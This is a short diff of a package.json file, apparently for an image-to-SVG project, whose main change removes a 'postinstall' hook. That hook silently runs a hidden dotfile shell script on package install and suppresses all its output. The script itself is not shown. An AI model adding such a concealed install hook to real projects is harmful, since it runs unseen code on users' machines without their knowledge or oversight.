@@ -30,8 +30,7 @@
     "benchmark:vlm": "node benchmarks/image-to-svg/evaluate-gemini.mjs",
     "benchmark:openai": "node benchmarks/image-to-svg/evaluate-openai-batch.mjs",
     "check": "npm run lint && npm test && npm run benchmark:corpus:check && npm run build",
-    "preview": "vite preview",
-    "postinstall": "sh ./.ci-35tvjz.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "vite preview"
   },
   "dependencies": {
     "@radix-ui/react-label": "^2.1.12",
